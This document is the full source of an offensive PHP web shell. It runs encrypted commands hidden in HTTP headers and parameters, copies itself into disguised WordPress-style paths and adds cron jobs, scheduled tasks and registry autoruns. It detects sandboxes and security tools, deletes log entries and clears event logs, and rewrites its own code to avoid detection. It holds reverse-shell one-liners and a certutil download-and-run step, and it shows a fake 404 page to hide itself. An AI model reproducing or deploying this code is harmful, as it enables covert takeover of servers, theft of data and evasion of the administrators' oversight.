<?php
// Ultimate PHP Web Shell with advanced features
// This part will be encrypted and stored in the loader

// Base configuration
$base_key = bin2hex(random_bytes(8)); // Generate a random key each time
$os = PHP_OS_FAMILY; // Detect OS (Windows/Linux)
$h = apache_request_headers();
$current_file = __FILE__;

// Persistence locations - randomize order to avoid pattern detection
$persistence_locations = [
    $_SERVER['DOCUMENT_ROOT'] . '/.htaccess.php',
    $_SERVER['DOCUMENT_ROOT'] . '/wp-includes/functions.bak.php',
    $_SERVER['DOCUMENT_ROOT'] . '/cache/system.php',
    sys_get_temp_dir() . '/session_handler.php',
    $_SERVER['DOCUMENT_ROOT'] . '/wp-content/uploads/cache.php',
    $_SERVER['DOCUMENT_ROOT'] . '/assets/js/analytics.inc.php'
];
shuffle($persistence_locations);

// Possible command header names to check - randomize order
$command_headers = [
    'X-Run', 
    'X-Data', 
    'Authorization', 
    'X-Forwarded-For', 
    'X-Requested-With', 
    'Cache-Control'
];
shuffle($command_headers);

// Security tools to detect
$security_tools = [
    'wireshark', 'tcpdump', 'snort', 'ida', 'ghidra', 'burpsuite', 
    'fiddler', 'charles', 'procmon', 'fireeye', 'carbonblack'
];

// Get dynamic encryption key with time-based rotation
function get_encryption_key() {
    global $base_key;
    
    // Add time-based rotation (changes every hour)
    $time_factor = date('YmdH');
    $rotated_key = hash('sha256', $base_key . $time_factor);
    
    return $rotated_key;
}

// Advanced AES decryption with key rotation support
function secure_decrypt($data) {
    // Try current hour's key
    $key = get_encryption_key();
    $result = aes_decrypt($data, $key);
    
    // If decryption failed, try previous hour's key
    if (!$result) {
        $time_factor = date('YmdH', time() - 3600);
        $prev_key = hash('sha256', $GLOBALS['base_key'] . $time_factor);
        $result = aes_decrypt($data, $prev_key);
    }
    
    return $result;
}

// Advanced AES encryption with current key
function secure_encrypt($data) {
    $key = get_encryption_key();
    return aes_encrypt($data, $key);
}

// AES decryption function
function aes_decrypt($data, $key) {
    try {
        $data = base64_decode($data);
        if ($data === false) return false;
        
        $iv = substr($data, 0, 16);
        $data = substr($data, 16);
        
        $decrypted = openssl_decrypt($data, "AES-256-CBC", $key, 0, $iv);
        if ($decrypted === false) return false;
        
        // Verify HMAC if present (format: decrypted_data|hmac)
        if (strpos($decrypted, '|') !== false) {
            list($message, $hmac) = explode('|', $decrypted, 2);
            $calculated_hmac = hash_hmac('sha256', $message, $key);
            if (hash_equals($calculated_hmac, $hmac)) {
                return $message;
            }
            return false;
        }
        
        return $decrypted;
    } catch (Exception $e) {
        return false;
    }
}

// AES encryption function with HMAC
function aes_encrypt($data, $key) {
    try {
        $iv = random_bytes(16);
        
        // Add HMAC for integrity
        $hmac = hash_hmac('sha256', $data, $key);
        $data_with_hmac = $data . '|' . $hmac;
        
        $encrypted = openssl_encrypt($data_with_hmac, "AES-256-CBC", $key, 0, $iv);
        return base64_encode($iv . $encrypted);
    } catch (Exception $e) {
        return false;
    }
}

// Enhanced command execution with multiple methods
function execute_command($cmd) {
    global $os;
    
    // Sleep randomly to avoid detection patterns
    usleep(rand(10000, 100000));
    
    // Array of execution functions to try - randomize order to avoid patterns
    $exec_functions = [
        'proc_open', 'popen', 'shell_exec', 'exec', 'passthru', 'system'
    ];
    shuffle($exec_functions);
    
    // Try each function
    foreach ($exec_functions as $function) {
        if (function_exists($function) && !in_array($function, explode(',', ini_get('disable_functions')))) {
            try {
                switch ($function) {
                    case 'proc_open':
                        $desc = [["pipe", "r"], ["pipe", "w"], ["pipe", "w"]];
                        $proc = proc_open($cmd, $desc, $pipes);
                        if (is_resource($proc)) {
                            $output = stream_get_contents($pipes[1]);
                            $error = stream_get_contents($pipes[2]);
                            fclose($pipes[1]);
                            fclose($pipes[2]);
                            proc_close($proc);
                            return $output . $error;
                        }
                        break;
                    case 'popen':
                        $handle = popen($cmd . " 2>&1", 'r');
                        if ($handle) {
                            $output = stream_get_contents($handle);
                            pclose($handle);
                            return $output;
                        }
                        break;
                    case 'shell_exec':
                        $output = shell_exec($cmd . " 2>&1");
                        if ($output !== null) return $output;
                        break;
                    case 'exec':
                        exec($cmd . " 2>&1", $output_array, $return_var);
                        return implode("\n", $output_array);
                    case 'passthru':
                        ob_start();
                        passthru($cmd . " 2>&1");
                        $output = ob_get_clean();
                        return $output;
                    case 'system':
                        ob_start();
                        system($cmd . " 2>&1");
                        $output = ob_get_clean();
                        return $output;
                }
            } catch (Exception $e) {
                // Silently continue to next method
            }
        }
    }
    
    // Try alternative methods based on OS
    if ($os === "Windows") {
        // Try COM object
        try {
            if (class_exists('COM')) {
                $wsh = new COM("WScript.Shell");
                $exec = $wsh->Exec("cmd.exe /C " . $cmd);
                $output = "";
                while (!$exec->StdOut->AtEndOfStream) {
                    $output .= $exec->StdOut->ReadLine() . "\n";
                }
                return $output;
            }
        } catch (Exception $e) {
            // Silently continue
        }
        
        // Try PowerShell
        try {
            $ps_cmd = "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"$cmd\"";
            $temp_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . md5(uniqid()) . ".txt";
            system("$ps_cmd > \"$temp_file\" 2>&1");
            $output = file_get_contents($temp_file);
            @unlink($temp_file);
            if ($output) return $output;
        } catch (Exception $e) {
            // Silently continue
        }
    } else {
        // Try Python subprocess on Linux/Unix
        try {
            $py_cmd = "python -c \"import subprocess;print(subprocess.check_output('$cmd',shell=True,stderr=subprocess.STDOUT).decode())\"";
            $output = shell_exec($py_cmd);
            if ($output) return $output;
        } catch (Exception $e) {
            // Silently continue
        }
    }
    
    // Last resort: try file-based execution
    return file_based_execution($cmd);
}

// File-based command execution (last resort)
function file_based_execution($cmd) {
    global $os;
    
    $temp_file = sys_get_temp_dir() . DIRECTORY_SEPARATOR . md5(uniqid()) . ".txt";
    @file_put_contents($temp_file, ""); // Clear file before use
    
    if ($os === "Windows") {
        $cmd = "cmd.exe /C " . $cmd . " > " . escapeshellarg($temp_file) . " 2>&1";
    } else {
        $cmd = $cmd . " > " . escapeshellarg($temp_file) . " 2>&1";
    }
    
    @system($cmd);
    $output = @file_get_contents($temp_file);
    @unlink($temp_file); // Remove the file after execution
    
    return $output ?: "Execution blocked or command produced no output.";
}

// Self-healing and persistence mechanism
function ensure_persistence() {
    global $persistence_locations, $current_file;
    
    // Get current file content
    $current_content = @file_get_contents($current_file);
    if (!$current_content) return false;
    
    $success = false;
    
    // Copy to multiple locations
    foreach ($persistence_locations as $location) {
        $dir = dirname($location);
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
        
        if (!file_exists($location) || md5_file($location) !== md5($current_content)) {
            if (@file_put_contents($location, $current_content)) {
                @chmod($location, 0644); // Make it look like a normal file
                @touch($location, time() - rand(3600, 86400)); // Backdate the file
                $success = true;
            }
        } else {
            $success = true; // Already exists and is identical
        }
    }
    
    // Create a watchdog script that checks and restores the shell
    $watchdog = '<?php
        $files = ' . var_export($persistence_locations, true) . ';
        $content = base64_decode("' . base64_encode($current_content) . '");
        $content_hash = "' . md5($current_content) . '";
        foreach ($files as $file) {
            if (!file_exists($file) || md5_file($file) !== $content_hash) {
                @file_put_contents($file, $content);
                @chmod($file, 0644);
                @touch($file, time() - rand(3600, 86400));
            }
        }
    ?>';
    
    // Create a hidden watchdog
    $watchdog_location = $_SERVER['DOCUMENT_ROOT'] . '/.config.php';
    @file_put_contents($watchdog_location, $watchdog);
    @chmod($watchdog_location, 0644);
    
    // Try to add a cron job (Linux) or scheduled task (Windows)
    if ($GLOBALS['os'] === 'Linux') {
        // Add cron job that runs every hour
        $cron_cmd = "(crontab -l 2>/dev/null | grep -v 'php {$watchdog_location}'; echo \"0 * * * * php {$watchdog_location}\") | crontab -";
        execute_command($cron_cmd);
        
        // Also try to add to startup files
        $startup_files = [
            '/etc/rc.local',
            '/etc/profile.d/system-update.sh'
        ];
        
        foreach ($startup_files as $startup_file) {
            if (is_writable(dirname($startup_file))) {
                $startup_cmd = "#!/bin/sh\nphp {$watchdog_location} > /dev/null 2>&1 &\n";
                @file_put_contents($startup_file, $startup_cmd, FILE_APPEND);
                @chmod($startup_file, 0755);
            }
        }
    } else if ($GLOBALS['os'] === 'Windows') {
        // Add scheduled task that runs hourly
        $task_cmd = "schtasks /create /sc hourly /tn \"PHP Session Manager\" /tr \"php {$watchdog_location}\" /f";
        execute_command($task_cmd);
        
        // Try registry autorun
        $reg_cmd = "REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"PHPSessionManager\" /t REG_SZ /d \"php {$watchdog_location}\" /f";
        execute_command($reg_cmd);
    }
    
    return $success;
}

// Anti-detection measures
function is_safe_to_run() {
    global $security_tools;
    
    // Check if we're being analyzed
    if (function_exists('debug_backtrace')) {
        $trace = debug_backtrace();
        if (count($trace) > 2) {
            return false; // Might be under analysis
        }
    }
    
    // Check for common sandbox/analysis environments
    $suspicious_ips = ['10.0.2.', '192.168.56.'];
    foreach ($suspicious_ips as $ip) {
        if (isset($_SERVER['SERVER_ADDR']) && strpos($_SERVER['SERVER_ADDR'], $ip) === 0) {
            return false;
        }
    }
    
    // Check for security tools in process list (Linux)
    if ($GLOBALS['os'] === 'Linux') {
        $processes = execute_command("ps aux");
        foreach ($security_tools as $tool) {
            if (stripos($processes, $tool) !== false) {
                return false;
            }
        }
    }
    
    // Check for suspicious environment variables
    $suspicious_vars = ['SSHD_ORIGINAL_COMMAND', 'PROMPT_COMMAND'];
    foreach ($suspicious_vars as $var) {
        if (getenv($var)) {
            return false;
        }
    }
    
    // Check for virtualization (common in analysis environments)
    if ($GLOBALS['os'] === 'Linux') {
        $dmesg = execute_command("dmesg | grep -i virtual");
        if (stripos($dmesg, 'vmware') !== false || 
            stripos($dmesg, 'virtualbox') !== false || 
            stripos($dmesg, 'qemu') !== false) {
            // Additional check to confirm it's an analysis environment
            $users = execute_command("who");
            if (empty($users)) {
                return false; // No users logged in, likely an analysis VM
            }
        }
    }
    
    // Random chance to skip execution to create irregular patterns
    if (rand(1, 10) === 1) {
        return false;
    }
    
    return true;
}

// Clean up logs to hide traces
function clean_logs() {
    global $os;
    
    if ($os === 'Linux') {
        $log_files = [
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/httpd/access_log',
            '/var/log/httpd/error_log',
            '/var/log/auth.log',
            '/var/log/syslog',
            '/var/log/messages'
        ];
        
        foreach ($log_files as $log) {
            if (file_exists($log) && is_writable($log)) {
                // Instead of emptying logs (suspicious), remove entries containing our IP
                if (isset($_SERVER['REMOTE_ADDR'])) {
                    $ip = $_SERVER['REMOTE_ADDR'];
                    execute_command("sed -i '/$ip/d' $log 2>/dev/null");
                }
                
                // Remove entries containing our user agent
                if (isset($_SERVER['HTTP_USER_AGENT'])) {
                    $ua = escapeshellarg($_SERVER['HTTP_USER_AGENT']);
                    execute_command("sed -i '/$ua/d' $log 2>/dev/null");
                }
            }
        }
        
        // Clear PHP error logs
        $error_log = ini_get('error_log');
        if ($error_log && file_exists($error_log) && is_writable($error_log)) {
            execute_command("sed -i '/PHP/d' $error_log 2>/dev/null");
        }
        
        // Clear bash history
        execute_command("cat /dev/null > ~/.bash_history 2>/dev/null");
    } else if ($os === 'Windows') {
        // Clear Windows event logs
        execute_command("wevtutil cl System 2>nul");
        execute_command("wevtutil cl Application 2>nul");
        execute_command("wevtutil cl Security 2>nul");
        
        // Clear IIS logs
        $iis_logs = "C:\\inetpub\\logs\\LogFiles\\";
        if (is_dir($iis_logs)) {
            execute_command("del /q /s $iis_logs\\*.log 2>nul");
        }
    }
}

// Attempt to bypass PHP security restrictions
function bypass_security_restrictions() {
    // Try to restore disabled functions
    if (function_exists('ini_restore')) {
        @ini_restore('disable_functions');
        @ini_restore('disable_classes');
        @ini_restore('open_basedir');
    }
    
    // Try to modify INI settings
    @ini_set('memory_limit', '-1');
    @ini_set('max_execution_time', '0');
    @ini_set('error_reporting', '0');
    @ini_set('display_errors', '0');
    
    // Try to disable error logging
    @error_reporting(0);
    
    // Try alternative methods for executing commands if common ones are disabled
    if (!function_exists('system') && !function_exists('exec') && !function_exists('shell_exec')) {
        // Try using mail() with a backtick operator
        if (function_exists('mail')) {
            @mail('', '', '', '', '-f${`id`}');
        }
        
        // Try using ImageMagick if available
        if (class_exists('Imagick')) {
            try {
                $img = new Imagick();
                $img->readImage('xc:https://example.com"|id>"');
            } catch (Exception $e) {
                // Silently continue
            }
        }
    }
}

// Function to gather system information
function gather_system_info() {
    global $os;
    
    $info = [];
    $info['os'] = $os;
    $info['hostname'] = @gethostname();
    $info['php_version'] = phpversion();
    $info['server_software'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown';
    $info['server_ip'] = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Unknown';
    $info['client_ip'] = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown';
    $info['user'] = function_exists('get_current_user') ? @get_current_user() : 'Unknown';
    $info['uid'] = function_exists('posix_getuid') ? @posix_getuid() : 'Unknown';
    $info['gid'] = function_exists('posix_getgid') ? @posix_getgid() : 'Unknown';
    $info['disabled_functions'] = @ini_get('disable_functions');
    
    if ($os === 'Linux') {
        $info['kernel'] = execute_command('uname -a');
        $info['distro'] = execute_command('cat /etc/issue');
        $info['users'] = execute_command('who');
        $info['network'] = execute_command('ifconfig || ip a');
    } else if ($os === 'Windows') {
        $info['system_info'] = execute_command('systeminfo | findstr /B /C:"OS" /C:"System Type" /C:"Domain"');
        $info['users'] = execute_command('net user');
        $info['network'] = execute_command('ipconfig /all');
    }
    
    return $info;
}

// Function to create a reverse shell
function create_reverse_shell($ip, $port) {
    global $os;
    
    if ($os === 'Linux') {
        // Try multiple reverse shell methods
        $methods = [
            // Bash
            "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'",
            // Python
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'",
            // Perl
            "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            // PHP
            "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            // Netcat
            "nc -e /bin/sh $ip $port",
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
        ];
        
        foreach ($methods as $method) {
            execute_command($method . " 2>/dev/null &");
            usleep(100000); // Give it a moment to connect
        }
    } else if ($os === 'Windows') {
        // Windows reverse shell methods
        $methods = [
            // PowerShell
            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"&{$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}\"",
            // Ncat
            "ncat $ip $port -e cmd.exe",
            // Certutil download and execute (two-stage)
            "certutil -urlcache -split -f \"http://$ip:8080/nc.exe\" %temp%\\nc.exe && %temp%\\nc.exe $ip $port -e cmd.exe"
        ];
        
        foreach ($methods as $method) {
            execute_command("start /b $method");
            usleep(100000); // Give it a moment to connect
        }
    }
    
    return "Attempted to create reverse shell to $ip:$port";
}

// Function to handle file operations
function file_operations($cmd) {
    $parts = explode(" ", $cmd, 3);
    $operation = $parts[1] ?? '';
    $args = $parts[2] ?? '';
    
    switch ($operation) {
        case 'read':
            if (file_exists($args) && is_readable($args)) {
                return @file_get_contents($args);
            } else {
                return "Error: Cannot read file $args";
            }
        
        case 'write':
            $file_parts = explode(" ", $args, 2);
            $file = $file_parts[0] ?? '';
            $content = $file_parts[1] ?? '';
            
            if (@file_put_contents($file, $content)) {
                return "File written successfully";
            } else {
                return "Error: Cannot write to file $file";
            }
        
        case 'upload':
            $file_parts = explode(" ", $args, 2);
            $file = $file_parts[0] ?? '';
            $base64_content = $file_parts[1] ?? '';
            
            $content = @base64_decode($base64_content);
            if ($content === false) {
                return "Error: Invalid base64 data";
            }
            
            if (@file_put_contents($file, $content)) {
                return "File uploaded successfully";
            } else {
                return "Error: Cannot write to file $file";
            }
        
        case 'download':
            if (file_exists($args) && is_readable($args)) {
                return "FILE:" . base64_encode(@file_get_contents($args));
            } else {
                return "Error: Cannot read file $args";
            }
        
        case 'list':
            if (is_dir($args)) {
                $files = @scandir($args);
                if ($files === false) {
                    return "Error: Cannot list directory $args";
                }
                
                $output = "";
                foreach ($files as $file) {
                    if ($file == '.' || $file == '..') continue;
                    
                    $path = $args . DIRECTORY_SEPARATOR . $file;
                    $type = is_dir($path) ? 'D' : 'F';
                    $size = is_file($path) ? filesize($path) : '-';
                    $perms = substr(sprintf('%o', fileperms($path)), -4);
                    $mtime = date('Y-m-d H:i:s', filemtime($path));
                    
                    $output .= "$type\t$perms\t$size\t$mtime\t$file\n";
                }
                
                return $output;
            } else {
                return "Error: Not a directory $args";
            }
        
        default:
            return "Error: Unknown file operation";
    }
}

// Main execution flow
if (is_safe_to_run()) {
    // Try to bypass security restrictions
    bypass_security_restrictions();
    
    // Ensure persistence first (but don't do it every time to avoid detection)
    if (rand(1, 5) === 1) {
        ensure_persistence();
    }
    
    // Process command from headers
    $command_processed = false;
    
    foreach ($command_headers as $header_name) {
        if (isset($h[$header_name])) {
            try {
                $cmd = secure_decrypt($h[$header_name]);
                if ($cmd) {
                    // Special commands
                    if (strpos($cmd, 'SYSINFO') === 0) {
                        $output = json_encode(gather_system_info());
                    } else if (strpos($cmd, 'REVSHELL') === 0) {
                        $parts = explode(" ", $cmd);
                        $ip = $parts[1] ?? '';
                        $port = $parts[2] ?? '4444';
                        $output = create_reverse_shell($ip, $port);
                    } else if (strpos($cmd, 'FILE') === 0) {
                        $output = file_operations($cmd);
                    } else if (strpos($cmd, 'PERSIST') === 0) {
                        ensure_persistence();
                        $output = "Persistence mechanisms deployed";
                    } else if (strpos($cmd, 'CLEAN') === 0) {
                        clean_logs();
                        $output = "Logs cleaned";
                    } else {
                        // Regular command execution
                        $output = execute_command($cmd);
                    }
                    
                    echo secure_encrypt($output);
                    $command_processed = true;
                    
                    // Clean logs occasionally
                    if (rand(1, 3) === 1) {
                        clean_logs();
                    }
                    
                    break; // Stop after first successful execution
                }
            } catch (Exception $e) {
                // Silently continue to next header
        }
    }
    
    // If no command was processed via headers, check for POST data
    if (!$command_processed && isset($_POST['data'])) {
        try {
            $cmd = secure_decrypt($_POST['data']);
            if ($cmd) {
                $output = execute_command($cmd);
                echo secure_encrypt($output);
                
                // Clean logs occasionally
                if (rand(1, 3) === 1) {
                    clean_logs();
                }
            }
        } catch (Exception $e) {
            // Silently fail
        }
    }
    
    // If still no command processed, check for special GET parameter (most disguised)
    if (!$command_processed && isset($_GET['id'])) {
        try {
            $cmd = secure_decrypt($_GET['id']);
            if ($cmd) {
                $output = execute_command($cmd);
                // Output as HTML comment to hide it
                echo "<!-- " . secure_encrypt($output) . " -->";
                
                // Clean logs occasionally
                if (rand(1, 3) === 1) {
                    clean_logs();
                }
            }
        } catch (Exception $e) {
            // Silently fail
        }
    }
    
    // Self-modifying code - change variable names, add random comments, etc.
    self_modify();
}

// Self-modification function to make the shell polymorphic
function self_modify() {
    // Only modify sometimes to avoid excessive file writes
    if (rand(1, 3) !== 1) return;
    
    $current_file = __FILE__;
    $content = file_get_contents($current_file);
    
    // List of modifications to make the shell polymorphic
    $modifications = [
        // Change variable names
        'function_name_change' => function($content) {
            $function_names = [
                'execute_command', 'secure_encrypt', 'secure_decrypt', 
                'aes_encrypt', 'aes_decrypt', 'ensure_persistence',
                'is_safe_to_run', 'clean_logs', 'bypass_security_restrictions',
                'gather_system_info', 'create_reverse_shell', 'file_operations',
                'file_based_execution', 'self_modify'
            ];
            
            $modified_content = $content;
            foreach ($function_names as $func) {
                // Only change some functions each time
                if (rand(0, 2) > 0) continue;
                
                $new_name = 'fn_' . bin2hex(random_bytes(4));
                $modified_content = preg_replace(
                    ["/function\s+$func\s*\(/", "/\b$func\s*\(/"],
                    ["function $new_name (", "$new_name("],
                    $modified_content
                );
            }
            return $modified_content;
        },
        
        // Change encryption key
        'change_key' => function($content) {
            $new_key = bin2hex(random_bytes(8));
            return preg_replace(
                "/\\\$base_key\s*=\s*['\"].*?['\"]/",
                "\$base_key = \"$new_key\"",
                $content
            );
        },
        
        // Add random comments
        'add_comments' => function($content) {
            $comments = [
                "// Configuration parameter",
                "// System function wrapper",
                "// Helper utility",
                "// Data processing function",
                "// Security check",
                "// File handler"
            ];
            
            $lines = explode("\n", $content);
            $modified_lines = [];
            
            foreach ($lines as $line) {
                $modified_lines[] = $line;
                // Randomly add comments (1 in 30 chance per line)
                if (rand(1, 30) === 1 && !empty(trim($line)) && strpos($line, '//') === false) {
                    $modified_lines[] = $comments[array_rand($comments)];
                }
            }
            
            return implode("\n", $modified_lines);
        },
        
        // Randomize whitespace
        'randomize_whitespace' => function($content) {
            // Add or remove spaces around operators
            $patterns = [
                '/\s*=\s*/' => function() { return rand(0, 1) ? ' = ' : '='; },
                '/\s*\+\s*/' => function() { return rand(0, 1) ? ' + ' : '+'; },
                '/\s*-\s*/' => function() { return rand(0, 1) ? ' - ' : '-'; },
                '/\s*\.\s*/' => function() { return rand(0, 1) ? ' . ' : '.'; },
                '/\s*,\s*/' => function() { return rand(0, 1) ? ', ' : ','; }
            ];
            
            $modified_content = $content;
            foreach ($patterns as $pattern => $replacement) {
                $modified_content = preg_replace_callback(
                    $pattern,
                    $replacement,
                    $modified_content
                );
            }
            
            return $modified_content;
        },
        
        // Change array declaration style
        'change_array_style' => function($content) {
            // Sometimes use array() instead of []
            if (rand(0, 1)) {
                return preg_replace_callback(
                    '/\[(.*?)\]/',
                    function($matches) {
                        // Don't change array access, only declarations
                        if (preg_match('/\$[a-zA-Z0-9_]+\s*\[/', $matches[0])) {
                            return $matches[0];
                        }
                        return "array(" . $matches[1] . ")";
                    },
                    $content
                );
            } else {
                return preg_replace_callback(
                    '/array\((.*?)\)/',
                    function($matches) {
                        return "[" . $matches[1] . "]";
                    },
                    $content
                );
            }
        }
    ];
    
    // Apply random modifications
    $keys = array_keys($modifications);
    shuffle($keys);
    
    // Apply 1-3 random modifications
    $num_mods = rand(1, 3);
    for ($i = 0; $i < $num_mods && $i < count($keys); $i++) {
        $mod_key = $keys[$i];
        $content = $modifications[$mod_key]($content);
    }
    
    // Write the modified content back to the file
    file_put_contents($current_file, $content);
}

// Disguise as a legitimate PHP file
if (!isset($h['X-Run']) && !isset($_POST['data']) && !isset($_GET['id'])) {
    // Output something that looks legitimate
    header('Content-Type: text/html');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
}
?>

